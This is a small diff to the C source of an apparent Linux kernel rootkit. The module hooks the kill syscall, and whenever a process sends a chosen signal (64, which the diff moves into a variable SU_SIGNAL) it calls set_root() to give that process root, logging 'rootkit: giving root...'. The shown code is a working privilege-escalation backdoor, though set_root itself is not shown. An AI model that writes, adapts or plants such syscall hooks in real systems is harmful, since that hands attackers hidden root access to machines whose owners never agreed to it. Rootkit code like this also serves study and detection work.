@@ -1,5 +1,7 @@
 #include "hooks.h"
 
+uint8_t SU_SIGNAL = 64;
+
 asmlinkage long (*orig_kill)(const struct pt_regs *);
 
 
@@ -26,7 +28,7 @@ void set_root(void) {
 asmlinkage long hook_kill(const struct pt_regs* regs) {
     int sig = regs->si;
 
-    if (sig == 64)
+    if (sig == SU_SIGNAL)
     {
         printk(KERN_INFO "rootkit: giving root...\n");
         set_root();
